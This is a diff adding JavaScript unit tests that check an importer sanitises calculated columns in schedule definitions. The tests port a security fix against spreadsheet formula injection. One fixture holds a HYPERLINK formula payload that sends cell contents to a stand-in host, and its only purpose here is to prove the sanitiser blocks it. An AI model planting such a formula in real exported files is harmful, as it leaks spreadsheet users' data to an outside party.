@@ -164,6 +164,45 @@ describe('imported schedules are sanitised', () => {
     expect(d.sort.length).toBe(4);
   });
 
+  // ifcTable's security fix of 2026-11-07 (7336b89), ported for SGVue v1.5.0: every route a
+  // definition takes in — a .schedule.json, a saved setup, a project file, the assistant and
+  // the Schedules port — is read by parseScheduleDef.
+  it('never lets a calculated name through as an object', () => {
+    // An object here became the column heading and reached exceljs, which wrote it as a
+    // live formula. The name must come back as text, or the entry must go.
+    const evil = {
+      ...base,
+      columns: [{ field: { kind: 'formula', id: 'c1' } }],
+      calculated: [{
+        id: 'c1', kind: 'formula', formula: 'A * 2',
+        name: { formula: 'HYPERLINK("http://x/?d="&A2,"Area")', result: 'Area', length: 4 },
+      }],
+    };
+    for (const c of parseScheduleDef(evil).calculated ?? []) expect(typeof c.name).toBe('string');
+  });
+
+  it('drops calculated entries with an unknown kind, a non-string id or formula, or a bad field', () => {
+    const d = parseScheduleDef({
+      ...base,
+      calculated: [
+        { id: 'a', name: 'A', kind: 'script', formula: '1' },
+        { id: 7, name: 'B', kind: 'formula', formula: '1' },
+        { id: 'c', name: 'C', kind: 'formula', formula: { formula: 'X' } },
+        { id: 'd', name: 'D', kind: 'percentage', ofField: { kind: 'core', key: 'expressId' } },
+      ],
+    });
+    expect(d.calculated).toEqual([]);
+  });
+
+  it('keeps a well-formed calculated entry unchanged', () => {
+    const calculated = [
+      { id: 'c1', name: 'Area x', kind: 'formula', formula: 'Width * Height', unitKind: 'area', result: 'number' },
+      { id: 'c2', name: 'Big', kind: 'formula', formula: 'Width > 1', result: 'yesNo', yesNo: true },
+      { id: 'c3', name: 'Share', kind: 'percentage', ofField: { kind: 'prop', pset: '*', prop: 'Width' } },
+    ];
+    expect(parseScheduleDef({ ...base, calculated: structuredClone(calculated) }).calculated).toEqual(calculated);
+  });
+
   it('rejects a file whose columns are all unusable', () => {
     expect(() => parseScheduleDef({ ...base, columns: [{ nope: 1 }, 'x', null] }))
       .toThrow(ScheduleImportError);
